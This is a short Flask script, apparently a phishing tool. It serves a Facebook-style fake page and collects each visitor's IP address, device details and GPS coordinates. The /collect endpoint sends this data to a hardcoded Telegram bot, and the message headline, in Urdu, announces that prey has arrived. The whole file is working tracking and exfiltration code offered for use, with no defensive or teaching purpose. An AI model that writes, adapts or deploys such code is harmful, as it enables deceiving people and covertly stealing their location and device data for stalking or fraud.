from flask import Flask, request, render_template
import requests
import os

app = Flask(__name__)

# ==== Telegram Config ====
BOT_TOKEN = "7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg"
CHAT_ID = "6908281054"  # ← اپنا Chat ID یہاں رکھو

# ==== Home Page ====
@app.route('/')
def index():
    return render_template("fb.html")  # Facebook-style fake page

# ==== Data Collection ====
@app.route('/collect', methods=['POST'])
def collect():
    data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    latitude = data.get('latitude')
    longitude = data.get('longitude')

    # ==== Telegram Message ====
    message = f"""
👁️ شکار آیا!
🌐 IP Address: {ip}
📱 Device Info: {user_agent}
📍 Location: https://www.google.com/maps?q={latitude},{longitude}
🧠 Raw Data: {data}
    """

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {'chat_id': CHAT_ID, 'text': message}
    requests.post(url, data=payload)

    return "OK", 200

# ==== Launch ====
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
